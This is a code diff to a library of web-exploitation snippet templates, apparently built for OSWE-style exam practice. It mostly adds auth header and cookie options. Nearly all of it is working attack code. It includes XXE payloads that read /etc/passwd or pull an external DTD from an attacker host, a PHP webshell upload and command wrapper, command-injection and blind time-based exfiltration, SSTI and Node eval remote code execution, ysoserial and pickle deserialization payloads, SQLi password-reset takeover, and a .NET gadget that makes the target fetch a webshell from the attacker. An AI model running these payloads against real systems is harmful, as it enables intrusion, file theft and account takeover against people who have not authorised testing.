+    COOKIES = {}                   # EDIT e.g. {"session": "REPLACE"}
+    SESSION_COOKIES = True         # EDIT True keeps s cookies from login; False = only COOKIES above
+    r = send_request(METHOD, ROUTE_PATH, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
     print("[trigger]", r.status_code, r.text[:300])
     return r.text
 `
@@ -1908,19 +1983,22 @@ if (input.operation === "decrypt") {
     defaultFunction:"xxe_inline_file_read",
     aliases:["xxe","xml","doctype","entity","file read","inline","basic auth","401","www-authenticate"],
     useWhen:"XML parser accepts inline DOCTYPE/ENTITY and the file content can be reflected in the HTTP response. Paste the target XML shape in BODY_TEMPLATE and place __ENTITY__ where the file should expand.",
-    editFirst:["XML_PATH","BODY_TEMPLATE","RAW_XML","FILE_PATH","AUTH_MODE"],
+    editFirst:["XML_PATH","BODY_TEMPLATE","RAW_XML","FILE_PATH","HEADERS","COOKIES","SESSION_COOKIES"],
     dependsOn:["helper-xxe-response-extractor"],
     sourceRefs:["v4","Notion module 6.3.7","Notion module 6.3.8"],
     code:String.raw`def xxe_inline_file_read(file_path=None):
     XML_PATH = "/api/xml"                 # EDIT
     FILE_PATH = "/etc/passwd"             # EDIT
-    AUTH_MODE = "session"                 # EDIT: "session", "basic", or "none"
     CONTENT_TYPE = "application/xml"      # EDIT
     ENTITY_NAME = "xxe"                   # EDIT if name conflicts
     BODY_TEMPLATE = """<root><name>__ENTITY__</name></root>"""  # EDIT paste Burp XML body; put __ENTITY__ at injection point
     RAW_XML = ""                          # EDIT optional full XML; supports __DOCTYPE__, __ENTITY__, __FILE__
-    REQUEST_AUTH = (USERNAME, PASSWORD) if AUTH_MODE == "basic" else None
-    check(AUTH_MODE in ("session", "basic", "none"), "bad AUTH_MODE")
+    SESSION_COOKIES = False                # EDIT True reuses cookies learned by login(); False = only COOKIES below
+    HEADERS = {                            # EDIT explicit auth/header knobs
+        "Content-Type": CONTENT_TYPE,
+        # Basic auth example: "Authorization": "Basic BASE64_USER_COLON_PASS",
+    }
+    COOKIES = {}                           # EDIT e.g. {"JSESSIONID": "REPLACE"}
     target_file = file_path or FILE_PATH
 
     doctype = f'<!DOCTYPE data [<!ENTITY {ENTITY_NAME} SYSTEM "file://{target_file}">]>'
@@ -1932,9 +2010,9 @@ if (input.operation === "decrypt") {
 
     dprint("xml cookies:", s.cookies.get_dict())
     dprint("xml payload:", payload)
-    r = s.post(url(XML_PATH), data=payload, headers={"Content-Type": CONTENT_TYPE}, auth=REQUEST_AUTH, timeout=TIMEOUT)
+    r = send_request("POST", XML_PATH, data=payload, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
     print("[inline]", r.status_code, r.text[:500])
-    check(r.status_code != 401, "401: endpoint needs auth; try AUTH_MODE='basic'")
+    check(r.status_code != 401, "401: endpoint needs explicit HEADERS/COOKIES, e.g. Authorization: Basic ...")
     return extract_xxe_content(r.text, target_file)
 `
   },
@@ -1982,19 +2060,22 @@ if (input.operation === "decrypt") {
     defaultFunction:"xxe_external_dtd",
     aliases:["xxe","xml","doctype","entity","dtd","external dtd","oob","cdata","basic auth","401","www-authenticate"],
     useWhen:"Inline XXE works but file content breaks XML, or you specifically need the target to fetch an external DTD. Requires --lhost and --lport.",
-    editFirst:["XML_PATH","BODY_TEMPLATE","RAW_XML","FILE_PATH","DTD_NAME","AUTH_MODE","--lhost","--lport"],
+    editFirst:["XML_PATH","BODY_TEMPLATE","RAW_XML","FILE_PATH","DTD_NAME","HEADERS","COOKIES","SESSION_COOKIES","--lhost","--lport"],
     dependsOn:["helper-embedded-file-server","helper-xxe-response-extractor"],
     sourceRefs:["v4","Notion module 6.3.7","Notion module 6.3.8"],
     code:String.raw`def xxe_external_dtd():
     XML_PATH = "/api/xml"                 # EDIT
     FILE_PATH = "/etc/passwd"             # EDIT
-    AUTH_MODE = "session"                 # EDIT: "session", "basic", or "none"
     DTD_NAME = "wrapper.dtd"              # EDIT
     CONTENT_TYPE = "application/xml"      # EDIT
     BODY_TEMPLATE = """<root><name>__ENTITY__</name></root>"""  # EDIT paste Burp XML body; put __ENTITY__ at injection point
     RAW_XML = ""                          # EDIT optional full XML; supports __DOCTYPE__, __ENTITY__, __DTD_URL__, __FILE__
-    REQUEST_AUTH = (USERNAME, PASSWORD) if AUTH_MODE == "basic" else None
-    check(AUTH_MODE in ("session", "basic", "none"), "bad AUTH_MODE")
+    SESSION_COOKIES = False                # EDIT True reuses cookies learned by login(); False = only COOKIES below
+    HEADERS = {                            # EDIT explicit auth/header knobs
+        "Content-Type": CONTENT_TYPE,
+        # Basic auth example: "Authorization": "Basic BASE64_USER_COLON_PASS",
+    }
+    COOKIES = {}                           # EDIT e.g. {"JSESSIONID": "REPLACE"}
 
     # External DTD wrapper: useful when file content contains XML-breaking chars.
     dtd_body = '<!ENTITY wrapper "%start;%file;%end;">'
@@ -2015,9 +2096,9 @@ if (input.operation === "decrypt") {
     dprint("xml cookies:", s.cookies.get_dict())
     dprint("dtd url:", dtd_url)
     dprint("xml payload:", payload)
-    r = s.post(url(XML_PATH), data=payload, headers={"Content-Type": CONTENT_TYPE}, auth=REQUEST_AUTH, timeout=TIMEOUT)
+    r = send_request("POST", XML_PATH, data=payload, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
     print("[dtd]", r.status_code, r.text[:1000])
-    check(r.status_code != 401, "401: endpoint needs auth; try AUTH_MODE='basic'")
+    check(r.status_code != 401, "401: endpoint needs explicit HEADERS/COOKIES, e.g. Authorization: Basic ...")
     return extract_xxe_content(r.text, FILE_PATH)
 `
   },
@@ -2062,7 +2143,7 @@ if (input.operation === "decrypt") {
     defaultFunction:"upload_webshell",
     aliases:["upload","webshell","multipart","extension bypass"],
     useWhen:"Upload reaches a web-accessible path and server executes the uploaded extension.",
-    editFirst:["UPLOAD_PATH","SHELL_URL","FIELD","FILENAME","SHELL_BODY"],
+    editFirst:["UPLOAD_PATH","SHELL_URL","HEADERS","COOKIES","SESSION_COOKIES","FIELD","FILENAME","SHELL_BODY"],
     dependsOn:[],
     sourceRefs:["v4"],
     code:String.raw`def upload_webshell():
@@ -2071,12 +2152,15 @@ if (input.operation === "decrypt") {
     FIELD = "file"                          # EDIT
     FILENAME = "shell.php"                  # EDIT
     SHELL_BODY = "<?php system($_GET['cmd']); ?>"  # EDIT language
+    HEADERS = {}                            # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}                            # EDIT e.g. {"session": "REPLACE"}
+    SESSION_COOKIES = True                  # EDIT True keeps s cookies from login; False = only COOKIES above
 
     files = {FIELD: (FILENAME, SHELL_BODY, "application/octet-stream")}
-    r = s.post(url(UPLOAD_PATH), files=files, timeout=TIMEOUT)
+    r = send_request("POST", UPLOAD_PATH, files=files, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
     check(r.status_code in (200, 201, 302), "upload failed")
 
-    r = s.get(url(SHELL_URL), params={"cmd": "whoami"}, timeout=TIMEOUT)
+    r = send_request("GET", SHELL_URL, params={"cmd": "whoami"}, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
     check(r.status_code == 200, "webshell not reachable")
     print("[+] webshell uploaded")
     return SHELL_URL
@@ -2091,15 +2175,18 @@ if (input.operation === "decrypt") {
     defaultFunction:"run_cmd",
     aliases:["webshell","run command","cmd","rce"],
     useWhen:"You already have a webshell URL and need a clean command wrapper.",
-    editFirst:["SHELL_PATH","CMD_PARAM","OUTPUT_REGEX"],
+    editFirst:["SHELL_PATH","CMD_PARAM","HEADERS","COOKIES","SESSION_COOKIES","OUTPUT_REGEX"],
     dependsOn:[],
     sourceRefs:["v4"],
     code:String.raw`def run_cmd(cmd):
     SHELL_PATH = "/uploads/shell.php"  # EDIT
     CMD_PARAM = "cmd"                  # EDIT
+    HEADERS = {}                       # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}                       # EDIT e.g. {"session": "REPLACE"}
+    SESSION_COOKIES = True             # EDIT True keeps s cookies from login; False = only COOKIES above
     OUTPUT_REGEX = None                # EDIT: r"<pre>(.*?)</pre>" if needed
 
-    r = s.get(url(SHELL_PATH), params={CMD_PARAM: cmd}, timeout=TIMEOUT)
+    r = send_request("GET", SHELL_PATH, params={CMD_PARAM: cmd}, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
     check(r.status_code == 200, f"cmd failed: {r.status_code}")
     out = r.text
     if OUTPUT_REGEX:
@@ -2118,7 +2205,7 @@ if (input.operation === "decrypt") {
     defaultFunction:"run_cmd",
     aliases:["cmdi","command injection","rce","separator","sleep"],
     useWhen:"A parameter is concatenated into a shell command and response contains output.",
-    editFirst:["CMD_PATH","PARAM","SEPARATOR","MARKER"],
+    editFirst:["CMD_PATH","PARAM","HEADERS","COOKIES","SESSION_COOKIES","SEPARATOR","MARKER"],
     dependsOn:[],
     sourceRefs:["v4"],
     code:String.raw`def run_cmd(cmd):
@@ -2126,9 +2213,12 @@ if (input.operation === "decrypt") {
     PARAM = "host"            # EDIT
     SEPARATOR = "; "          # EDIT: ;, &&, |, newline
     MARKER = "OSWE"           # EDIT
+    HEADERS = {}              # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}              # EDIT e.g. {"session": "REPLACE"}
+    SESSION_COOKIES = True    # EDIT True keeps s cookies from login; False = only COOKIES above
 
     payload = f"127.0.0.1{SEPARATOR}echo {MARKER}; {cmd}; echo {MARKER}"
-    r = s.get(url(CMD_PATH), params={PARAM: payload}, timeout=TIMEOUT)
+    r = send_request("GET", CMD_PATH, params={PARAM: payload}, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
     check(r.status_code == 200, "command injection request failed")
     m = re.search(MARKER + r"(.*?)" + MARKER, r.text, re.S)
     out = (m.group(1) if m else r.text).strip()
@@ -2145,7 +2235,7 @@ if (input.operation === "decrypt") {
     defaultFunction:"dump_blind_cmd_time",
     aliases:["blind cmdi","sleep exfil","command timing","node child_process","time based command"],
     useWhen:"Command injection executes but does not return output; true character guesses trigger sleep delay.",
-    editFirst:["TRIGGER_PATH","JSON_BODY","INJECT_FIELD","INJECTION_TEMPLATE","FILE_PATH","DELAY","CHARSET"],
+    editFirst:["TRIGGER_PATH","HEADERS","COOKIES","SESSION_COOKIES","JSON_BODY","INJECT_FIELD","INJECTION_TEMPLATE","FILE_PATH","DELAY","CHARSET"],
     dependsOn:[],
     sourceRefs:["Skeleton Scripts"],
     code:String.raw`def dump_blind_cmd_time():
@@ -2160,6 +2250,8 @@ if (input.operation === "decrypt") {
     THRESHOLD = 2.5                               # EDIT baseline + margin
     CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-.@{}:/ "
     HEADERS = {"Content-Type": "application/json"}  # EDIT auth headers if needed
+    COOKIES = {}                                  # EDIT e.g. {"session": "REPLACE"}
+    SESSION_COOKIES = True                        # EDIT True keeps s cookies from login; False = only COOKIES above
 
     def probe(pos, ch):
         test = (
@@ -2170,7 +2262,7 @@ if (input.operation === "decrypt") {
         body = dict(JSON_BODY)
         body[INJECT_FIELD] = INJECTION_TEMPLATE.format(cmd=cmd)
         started = time.time()
-        s.post(url(TRIGGER_PATH), json=body, headers=HEADERS, timeout=TIMEOUT + DELAY)
+        send_request("POST", TRIGGER_PATH, json_body=body, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES, timeout=TIMEOUT + DELAY)
         return (time.time() - started) >= THRESHOLD
 
     out = ""
@@ -2197,7 +2289,7 @@ if (input.operation === "decrypt") {
     defaultFunction:"node_eval_json_injection",
     aliases:["node","eval injection","javascript injection","child_process","whitebox","json rce","htb"],
     useWhen:"Whitebox/source review shows user-controlled JSON reaches eval/new Function/template code in Node/JavaScript.",
-    editFirst:["ENDPOINT","FIELD","COMMAND","PAYLOADS","SUCCESS_MARKER"],
+    editFirst:["ENDPOINT","FIELD","HEADERS","COOKIES","SESSION_COOKIES","COMMAND","PAYLOADS","SUCCESS_MARKER"],
     dependsOn:[],
     sourceRefs:["HTB Senior Web module 9"],
     code:String.raw`def node_eval_json_injection():
@@ -2207,6 +2299,8 @@ if (input.operation === "decrypt") {
     BASE_BODY = {}                            # EDIT required JSON keys
     SUCCESS_MARKER = ""                       # EDIT optional marker in response
     HEADERS = {"Content-Type": "application/json"}  # EDIT auth if not already in session
+    COOKIES = {}                              # EDIT e.g. {"session": "REPLACE"}
+    SESSION_COOKIES = True                    # EDIT True keeps s cookies from login; False = only COOKIES above
 
     js_exec = "process.mainModule.require('child_process').execSync(" + json.dumps(COMMAND) + ").toString()"
     PAYLOADS = [                              # EDIT to match quote/context found in source
@@ -2219,7 +2313,7 @@ if (input.operation === "decrypt") {
     for payload in PAYLOADS:
         body = dict(BASE_BODY)
         body[FIELD] = payload
-        r = s.post(url(ENDPOINT), json=body, headers=HEADERS, timeout=TIMEOUT)
+        r = send_request("POST", ENDPOINT, json_body=body, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
         print("[payload]", payload[:80], "status", r.status_code)
         print(r.text[:500])
         if (SUCCESS_MARKER and SUCCESS_MARKER in r.text) or (not SUCCESS_MARKER and r.status_code < 500 and r.text):
@@ -2301,7 +2395,7 @@ def build_php_reverse_shell(mode="reflection_url"):
     defaultFunction:"run_cmd",
     aliases:["php eval","dol_eval","computed field","eval filter","ReflectionFunction","urldecode","str_rot13","pack hex","get_defined_functions","array_search","reverse shell"],
     useWhen:"You already found an HTTP action that stores or triggers a PHP eval-backed expression field.",
-    editFirst:["SUBMIT_PATH","TRIGGER_PATH","METHOD","PAYLOAD_FIELD","MODE","BASE_DATA","SUCCESS_MARKER"],
+    editFirst:["SUBMIT_PATH","TRIGGER_PATH","METHOD","HEADERS","COOKIES","SESSION_COOKIES","PAYLOAD_FIELD","MODE","BASE_DATA","SUCCESS_MARKER"],
     dependsOn:["helper-php-eval-filter-payloads"],
     sourceRefs:["OSWE module 11"],
     code:String.raw`def send_eval_payload(payload):
@@ -2311,16 +2405,19 @@ def build_php_reverse_shell(mode="reflection_url"):
     PAYLOAD_FIELD = "computed"                   # EDIT field/param that reaches eval
     BASE_DATA = {}                               # EDIT required fields, csrf token, ids, action, etc.
     SUCCESS_MARKER = ""                          # EDIT optional marker
+    HEADERS = {}                                  # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}                                  # EDIT e.g. {"session": "REPLACE"}
+    SESSION_COOKIES = True                        # EDIT True keeps s cookies from login; False = only COOKIES above
 
     data = dict(BASE_DATA)
     data[PAYLOAD_FIELD] = payload
 
     if METHOD == "POST_FORM":
-        r = s.post(url(SUBMIT_PATH), data=data, timeout=TIMEOUT)
+        r = send_request("POST", SUBMIT_PATH, data=data, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
     elif METHOD == "POST_JSON":
-        r = s.post(url(SUBMIT_PATH), json=data, timeout=TIMEOUT)
+        r = send_request("POST", SUBMIT_PATH, json_body=data, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
     elif METHOD == "GET_PARAM":
-        r = s.get(url(SUBMIT_PATH), params=data, timeout=TIMEOUT)
+        r = send_request("GET", SUBMIT_PATH, params=data, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
     else:
         die("bad METHOD")
 
@@ -2331,7 +2428,7 @@ def build_php_reverse_shell(mode="reflection_url"):
         check(SUCCESS_MARKER in r.text, "success marker missing after submit")
 
     if TRIGGER_PATH:
-        r = s.get(url(TRIGGER_PATH), timeout=TIMEOUT)
+        r = send_request("GET", TRIGGER_PATH, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
         dprint("trigger status:", r.status_code, r.url)
         dprint("trigger body:", r.text[:700])
         check(r.status_code not in (401, 403), "trigger blocked; fix login/auth/csrf first")
@@ -2362,16 +2459,19 @@ def trigger_reverse_shell():
     defaultFunction:"run_cmd",
     aliases:["ssti","jinja","twig","freemarker","template rce"],
     useWhen:"Input reaches a server-side template engine and command output is reflected.",
-    editFirst:["SSTI_PATH","PARAM","PAYLOAD_SHAPE"],
+    editFirst:["SSTI_PATH","PARAM","HEADERS","COOKIES","SESSION_COOKIES","PAYLOAD_SHAPE"],
     dependsOn:[],
     sourceRefs:["v4"],
     code:String.raw`def run_cmd(cmd):
     SSTI_PATH = "/preview"  # EDIT
     PARAM = "name"          # EDIT
+    HEADERS = {}            # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}            # EDIT e.g. {"session": "REPLACE"}
+    SESSION_COOKIES = True  # EDIT True keeps s cookies from login; False = only COOKIES above
     PAYLOAD_SHAPE = "{{ cycler.__init__.__globals__.os.popen('CMD').read() }}"  # EDIT
 
     payload = PAYLOAD_SHAPE.replace("CMD", cmd.replace("'", "\\'"))
-    r = s.get(url(SSTI_PATH), params={PARAM: payload}, timeout=TIMEOUT)
+    r = send_request("GET", SSTI_PATH, params={PARAM: payload}, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
     check(r.status_code == 200, "ssti request failed")
     print(r.text.strip())
     return r.text
@@ -2386,7 +2486,7 @@ def trigger_reverse_shell():
     defaultFunction:"deliver_java_serialized_payload",
     aliases:["java","deserialization","readobject","ysoserial","base64","gadget"],
     useWhen:"Source shows Java object deserialization and you have a confirmed gadget/payload generator.",
-    editFirst:["ENDPOINT","FIELD","YSOSERIAL_JAR","GADGET","CMD"],
+    editFirst:["ENDPOINT","HEADERS","COOKIES","SESSION_COOKIES","FIELD","YSOSERIAL_JAR","GADGET","CMD"],
     dependsOn:[],
     sourceRefs:["v4"],
     code:String.raw`def deliver_java_serialized_payload():
@@ -2397,10 +2497,13 @@ def trigger_reverse_shell():
     YSOSERIAL_JAR = "ysoserial.jar"         # EDIT
     GADGET = "CommonsCollections1"          # EDIT
     CMD = "whoami"                          # EDIT
+    HEADERS = {}                            # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}                            # EDIT e.g. {"session": "REPLACE"}
+    SESSION_COOKIES = True                  # EDIT True keeps s cookies from login; False = only COOKIES above
 
     raw = subprocess.check_output(["java", "-jar", YSOSERIAL_JAR, GADGET, CMD])
     payload = base64.b64encode(raw).decode()  # EDIT: remove b64 if endpoint wants raw bytes
-    r = s.post(url(ENDPOINT), data={FIELD: payload}, timeout=TIMEOUT)
+    r = send_request("POST", ENDPOINT, data={FIELD: payload}, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
     check(r.status_code < 500, "deserialization delivery failed")
     print("[+] serialized payload delivered")
     return r
@@ -2415,7 +2518,7 @@ def trigger_reverse_shell():
     defaultFunction:"deliver_pickle_payload",
     aliases:["pickle","python","deserialization","loads","base64","rce"],
     useWhen:"Source confirms unsafe Python pickle.loads on attacker-controlled data.",
-    editFirst:["ENDPOINT","FIELD","CMD","ENCODING"],
+    editFirst:["ENDPOINT","HEADERS","COOKIES","SESSION_COOKIES","FIELD","CMD","ENCODING"],
     dependsOn:[],
     sourceRefs:["v4"],
     code:String.raw`def deliver_pickle_payload():
@@ -2426,6 +2529,9 @@ def trigger_reverse_shell():
     FIELD = "blob"            # EDIT
     CMD = "whoami"            # EDIT
     ENCODING = "base64"       # EDIT: raw/base64/cookie
+    HEADERS = {}              # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}              # EDIT e.g. {"session": "REPLACE"}
+    SESSION_COOKIES = True    # EDIT True keeps s cookies from login; False = only COOKIES above
 
     class RCE:
         def __reduce__(self):
@@ -2433,7 +2539,7 @@ def trigger_reverse_shell():
 
     raw = pickle.dumps(RCE())
     payload = base64.b64encode(raw).decode() if ENCODING == "base64" else raw
-    r = s.post(url(ENDPOINT), data={FIELD: payload}, timeout=TIMEOUT)
+    r = send_request("POST", ENDPOINT, data={FIELD: payload}, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
     check(r.status_code < 500, "pickle delivery failed")
     print("[+] pickle payload delivered")
     return r
@@ -2651,7 +2757,7 @@ def trigger_reverse_shell():
     defaultFunction:"send_injected",
     aliases:["sqli transport","inject param","inject body","inject header","inject cookie","raw body"],
     useWhen:"SQLi payload location changes between query, body, header, cookie, path, or raw request body.",
-    editFirst:["METHOD","PATH","INJECT_IN","INJECT_NAME","PARAMS","BODY","HEADERS","COOKIES","PREFIX","SUFFIX"],
+    editFirst:["METHOD","PATH","INJECT_IN","INJECT_NAME","PARAMS","BODY","HEADERS","COOKIES","SESSION_COOKIES","PREFIX","SUFFIX"],
     dependsOn:[],
     sourceRefs:["sqli_poc_kit.py"],
     code:String.raw`def send_injected(payload):
@@ -2666,6 +2772,7 @@ def trigger_reverse_shell():
     BODY = ""                      # EDIT: "a=1&b=__INJECT__" for raw_body
     HEADERS = {}                   # EDIT
     COOKIES = {}                   # EDIT
+    SESSION_COOKIES = True     # EDIT False = no s.cookies, only COOKIES above
 
     value = PREFIX + payload + SUFFIX
     params = dict(PARAMS)
@@ -2690,7 +2797,14 @@ def trigger_reverse_shell():
     else:
         die("bad INJECT_IN")
 
-    return s.request(METHOD, url(path), params=params, data=data, headers=headers, cookies=cookies, timeout=TIMEOUT)
+    return send_request(
+        METHOD, path,
+        params=params,
+        data=data,
+        headers=headers,
+        cookies=cookies,
+        session_cookies=SESSION_COOKIES,
+    )
 `
   },
   {
@@ -3000,7 +3114,7 @@ def quote_ident(value):
     defaultFunction:"app_cmd",
     aliases:["cmd dispatcher","frappe style","global_search","csrf none","guest cookies","whitelisted method","api method"],
     useWhen:"Framework dispatches backend methods through one HTTP endpoint with a cmd/method parameter.",
-    editFirst:["DISPATCH_PATH","CMD_PARAM","CSRF_HEADER","GUEST_CSRF","GUEST_COOKIES"],
+    editFirst:["DISPATCH_PATH","CMD_PARAM","HEADERS","COOKIES","SESSION_COOKIES","CSRF_HEADER","GUEST_CSRF","GUEST_COOKIES"],
     dependsOn:[],
     sourceRefs:["challenge5.py","Google Drive OSWE 5-Challenge"],
     code:String.raw`def app_cmd(cmd, params=None):
@@ -3009,19 +3123,23 @@ def quote_ident(value):
     CSRF_HEADER = "X-CSRF-Token"        # EDIT
     GUEST_CSRF = "None"                 # EDIT
     GUEST_COOKIES = {}                  # EDIT e.g. {"sid": "Guest", "user_id": "Guest"}
+    HEADERS = {}                        # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}                        # EDIT exact cookies; merged over GUEST_COOKIES
+    SESSION_COOKIES = False             # EDIT True keeps s cookies from login; False = guest/manual cookies only
 
-    headers = {
+    headers = dict(HEADERS)
+    headers.update({
         "X-Requested-With": "XMLHttpRequest",
         "Accept": "application/json, text/javascript, */*; q=0.01",
         CSRF_HEADER: s.headers.get(CSRF_HEADER, GUEST_CSRF),
-    }
-    if GUEST_COOKIES:
-        s.cookies.update(GUEST_COOKIES)
+    })
+    cookies = dict(GUEST_COOKIES)
+    cookies.update(COOKIES)
     data = {CMD_PARAM: cmd}
     if params:
         data.update(params)
     dprint("app_cmd data:", data)
-    r = s.post(url(DISPATCH_PATH), data=data, headers=headers, timeout=TIMEOUT)
+    r = send_request("POST", DISPATCH_PATH, data=data, headers=headers, cookies=cookies, session_cookies=SESSION_COOKIES)
     dprint("app_cmd status:", r.status_code, r.url)
     return r
 `
@@ -3086,7 +3204,7 @@ def quote_ident(value):
     defaultFunction:"reset_token_via_sqli",
     aliases:["reset token sqli","forgot password","takeover","update password","auth bypass"],
     useWhen:"You can trigger password reset, dump the reset key via SQLi, then set a new password.",
-    editFirst:["TARGET_USER","NEW_PASSWORD","FORGOT_CMD","TOKEN_QUERY","UPDATE_PATH"],
+    editFirst:["TARGET_USER","NEW_PASSWORD","FORGOT_CMD","TOKEN_QUERY","UPDATE_PATH","HEADERS","COOKIES","SESSION_COOKIES"],
     dependsOn:["helper-app-cmd-dispatch-session","union-json-row-extractor"],
     sourceRefs:["challenge5.py"],
     code:String.raw`def reset_token_via_sqli():
@@ -3096,12 +3214,15 @@ def quote_ident(value):
     TOKEN_QUERY = "1,2,3,4,reset_token"     # EDIT
     TOKEN_TABLE = "users"                   # EDIT
     UPDATE_PATH = "/update-password"        # EDIT
+    HEADERS = {}                            # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}                            # EDIT e.g. {"session": "REPLACE"}
+    SESSION_COOKIES = True                  # EDIT True keeps s cookies from login; False = only COOKIES above
 
     app_cmd(FORGOT_CMD, {"user": TARGET_USER})
     values = dump_union_json_rows(TOKEN_QUERY, TOKEN_TABLE, "route")
     check(values, "no reset token dumped")
     token = values[0]
-    r = s.post(url(UPDATE_PATH), data={"key": token, "new_password": NEW_PASSWORD}, timeout=TIMEOUT)
+    r = send_request("POST", UPDATE_PATH, data={"key": token, "new_password": NEW_PASSWORD}, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
     check(r.status_code in (200, 302), "password update failed")
     print("[+] password reset through SQLi token")
     return NEW_PASSWORD
@@ -3116,12 +3237,15 @@ def quote_ident(value):
     defaultFunction:"run_cmd",
     aliases:["jinja attr","ssti bypass","subclasses","popen","email template"],
     useWhen:"Jinja SSTI blocks dot/underscore syntax and attr() bypass reaches subprocess.Popen.",
-    editFirst:["SSTI_PATH","PARAM","POPEN_INDEX","CMD_SHAPE"],
+    editFirst:["SSTI_PATH","PARAM","HEADERS","COOKIES","SESSION_COOKIES","POPEN_INDEX","CMD_SHAPE"],
     dependsOn:[],
     sourceRefs:["challenge5.py"],
     code:String.raw`def run_cmd(cmd):
     SSTI_PATH = "/template/render"  # EDIT
     PARAM = "template"              # EDIT
+    HEADERS = {}                    # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}                    # EDIT e.g. {"session": "REPLACE"}
+    SESSION_COOKIES = True          # EDIT True keeps s cookies from login; False = only COOKIES above
     POPEN_INDEX = 500               # EDIT from finder
     CMD_SHAPE = "['/bin/bash','-c','CMD']"  # EDIT
 
@@ -3131,7 +3255,7 @@ def quote_ident(value):
         "|attr('__subclasses__')()|attr('__getitem__')(" + str(POPEN_INDEX) + ")("
         + cmd_list + ",stdout=-1)|attr('communicate')()|attr('__getitem__')(0)}}"
     )
-    r = s.post(url(SSTI_PATH), data={PARAM: payload}, timeout=TIMEOUT)
+    r = send_request("POST", SSTI_PATH, data={PARAM: payload}, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
     check(r.status_code == 200, "SSTI request failed")
     print(r.text)
     return r.text
@@ -3146,18 +3270,21 @@ def quote_ident(value):
     defaultFunction:"find_popen_index",
     aliases:["popen index","subclasses","ssti finder","jinja"],
     useWhen:"SSTI RCE needs the runtime index of subprocess.Popen in __subclasses__().",
-    editFirst:["SSTI_PATH","PARAM","START","STOP"],
+    editFirst:["SSTI_PATH","PARAM","HEADERS","COOKIES","SESSION_COOKIES","START","STOP"],
     dependsOn:[],
     sourceRefs:["challenge5.py"],
     code:String.raw`def find_popen_index():
     SSTI_PATH = "/template/render"  # EDIT
     PARAM = "template"              # EDIT
+    HEADERS = {}                    # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}                    # EDIT e.g. {"session": "REPLACE"}
+    SESSION_COOKIES = True          # EDIT True keeps s cookies from login; False = only COOKIES above
     START = 0                       # EDIT
     STOP = 900                      # EDIT
 
     for i in range(START, STOP):
         payload = "{{''.__class__.__mro__[1].__subclasses__()[" + str(i) + "]}}"
-        r = s.post(url(SSTI_PATH), data={PARAM: payload}, timeout=TIMEOUT)
+        r = send_request("POST", SSTI_PATH, data={PARAM: payload}, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
         if "Popen" in r.text:
             print("[+] Popen index", i)
             return i
@@ -3341,13 +3468,16 @@ def powershell_reverse_shell():
     defaultFunction:"dotnet_pullfile_webshell",
     aliases:["dotnet pullfile","aspx webshell","xmlserializer","webroot","deserialization"],
     useWhen:".NET deserialization gadget can make target fetch a remote file and write it into webroot.",
-    editFirst:["SHELL_NAME","WEBROOT","DELIVERY_COOKIE","--lhost","--lport"],
+    editFirst:["SHELL_NAME","WEBROOT","HEADERS","COOKIES","SESSION_COOKIES","DELIVERY_COOKIE","--lhost","--lport"],
     dependsOn:["helper-aspx-webshell-generator","helper-embedded-file-server","dotnet-xmlserializer-odp-payload"],
     sourceRefs:["dotnet.py"],
     code:String.raw`def dotnet_pullfile_webshell():
     SHELL_NAME = "shell.aspx"                   # EDIT
     WEBROOT = "C:/inetpub/wwwroot/app"          # EDIT
     DELIVERY_COOKIE = "VULNCOOKIE"              # EDIT
+    HEADERS = {}                                # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}                                # EDIT exact cookies; delivery cookie is added below
+    SESSION_COOKIES = True                      # EDIT True keeps s cookies from login; False = only COOKIES below
 
     shell = generate_aspx_shell()
     start_file_server(shell, SHELL_NAME, LPORT)
@@ -3356,8 +3486,9 @@ def powershell_reverse_shell():
     remote = callback_url(SHELL_NAME)
     dest = WEBROOT.rstrip("/") + "/" + SHELL_NAME
     payload = build_dotnet_odp_payload().replace("arg1", remote).replace("arg2", dest)
-    s.cookies.set(DELIVERY_COOKIE, quote(payload))
-    r = s.get(url("/404-" + str(int(time.time()))), timeout=TIMEOUT)
+    cookies = dict(COOKIES)
+    cookies[DELIVERY_COOKIE] = quote(payload)
+    r = send_request("GET", "/404-" + str(int(time.time())), headers=HEADERS, cookies=cookies, session_cookies=SESSION_COOKIES)
     print("[pullfile]", r.status_code)
     return "/" + SHELL_NAME
 `
@@ -3411,7 +3542,7 @@ def java_base62(seed_ms, length=40):
     defaultFunction:"time_seeded_reset_takeover",
